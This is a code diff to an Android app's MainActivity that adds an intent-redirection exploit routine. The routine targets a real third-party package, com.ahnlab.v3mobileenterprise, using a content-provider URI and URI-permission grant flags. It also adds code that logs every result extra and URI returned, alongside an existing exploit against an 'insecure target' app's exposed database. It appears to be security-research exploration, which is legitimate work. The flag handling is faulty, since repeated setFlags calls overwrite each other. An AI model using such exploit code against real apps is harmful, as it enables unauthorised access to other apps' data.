@@ -29,6 +29,7 @@ import java.io.InputStreamReader;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
+import java.util.Set;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -51,9 +52,15 @@ public class MainActivity extends AppCompatActivity {
         createNotificationChannel();
 
         // Exploit Insecure app's exposed DB (TempAccessDatabase)
-        if(BuildConfig.GRANT_URI_PERMISSIONS_EXPLOIT){
+        if(BuildConfig.INSECURE_TARGET_GRANT_URI_PERMISSIONS_EXPLOIT){
             exploitTempAccessDb();
         }
+
+        if(BuildConfig.INTENT_REDIRECTION_EXPLOIT_EXPLORATION){
+            exploitIntentRedirection();
+        }
+
+
     }
 
     @Override
@@ -250,6 +257,22 @@ public class MainActivity extends AppCompatActivity {
         notificationManager.createNotificationChannel(channel);
     }
 
+    public void exploitIntentRedirection(){
+        // Make modifications here
+        Uri targetCp = Uri.parse("content://com.ahnlab.v3mobileenterprise.provider/test.txt");
+        String targetPackage = "com.ahnlab.v3mobileenterprise";
+        String targetClass = "com.ahnlab.v3mobileenterprise.main.LauncherActivity";
+
+        Intent exploit = new Intent();
+        exploit.setData(targetCp);
+//        exploit.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        exploit.setFlags(Intent.FLAG_ACTIVITY_FORWARD_RESULT);
+        exploit.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+        exploit.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
+        exploit.setClassName(targetPackage, targetClass);
+        startActivityForResult(exploit, 0);
+    }
+
     /**
      * Exploit Insecure Target App's Temp Access DB via intent redirection attack.
      */
@@ -275,7 +298,36 @@ public class MainActivity extends AppCompatActivity {
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
 
-        if (BuildConfig.GRANT_URI_PERMISSIONS_EXPLOIT){
+        if(BuildConfig.INTENT_REDIRECTION_EXPLOIT_EXPLORATION){
+            // Check if the result data is not null
+            if (data != null) {
+                // Log the requestCode and resultCode to see which activity returned the result
+                Log.d(TAG, "RequestCode: " + requestCode);
+                Log.d(TAG, "ResultCode: " + resultCode);
+
+                // Log the entire Intent (this may be verbose)
+                Log.d(TAG, "Intent Data: " + data.toString());
+
+                // Iterate through all the extras in the Intent (if any) and print them
+                if (data.getExtras() != null) {
+                    Set<String> keys = data.getExtras().keySet();
+                    for (String key : keys) {
+                        Object value = data.getExtras().get(key);
+                        Log.d(TAG, "Extra: " + key + " = " + value);
+                    }
+                }
+
+                // Optionally, print specific data (e.g., if it's a Uri or some other type of data)
+                Uri uri = data.getData();
+                if (uri != null) {
+                    Log.d(TAG, "Received Uri: " + uri.toString());
+                }
+            } else {
+                Log.d(TAG, "No data received from activity.");
+            }
+        }
+
+        if (BuildConfig.INSECURE_TARGET_GRANT_URI_PERMISSIONS_EXPLOIT){
             try (InputStream inputStream = getContentResolver().openInputStream(data.getData());
                  BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
 
